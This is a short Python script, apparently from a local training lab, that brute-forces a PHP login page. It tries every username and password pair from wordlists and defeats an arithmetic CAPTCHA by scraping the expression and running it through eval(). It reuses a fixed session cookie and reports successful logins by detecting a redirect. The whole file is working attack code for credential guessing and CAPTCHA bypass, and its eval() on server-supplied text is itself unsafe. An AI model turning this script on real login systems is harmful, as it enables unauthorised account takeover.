import requests
import re
from colorama import Fore, Style

url = "http://localhost/bruteforce3/index.php"
cookies = {'PHPSESSID': 'amunh9loejgp2re94jp04g6p4f'}
data = {"username": "", "password": "", "captcha": ""}

rg_err = re.compile(r'<p style="color:red" >.*</p>')
rg_calc = re.compile(r'\d+\s+[\+-x]\s+\d+')

with open("/home/kali/Downloads/Labs3_Script/users.txt") as users:
    while user := users.readline():
        with open("/home/kali/Downloads/Labs3_Script/passwords.txt") as passwords:
            while password := passwords.readline():

                req = requests.get(url, cookies=cookies)

                html = req.text

                calc = rg_calc.findall(html)[0].replace('x', '*')

                res = str(eval(calc))

                data["username"] = user.strip()
                data["password"] = password.strip()
                data["captcha"] = res

                post_response = requests.post(url=url, cookies=cookies, data=data)

                if(post_response.history):
                    res_post = "Sucesso"
                else:
                    res_post = rg_err.findall(post_response.text)[0].replace('<p style="color:red" >', '').replace('</p>', '')

                if res_post == "Sucesso": 
                    print(Fore.GREEN, data["username"] + " - " + data["password"] + " - " + res_post)
                else:
                    print(Style.RESET_ALL, data["username"] + " - " + data["password"] + " - " + res_post)
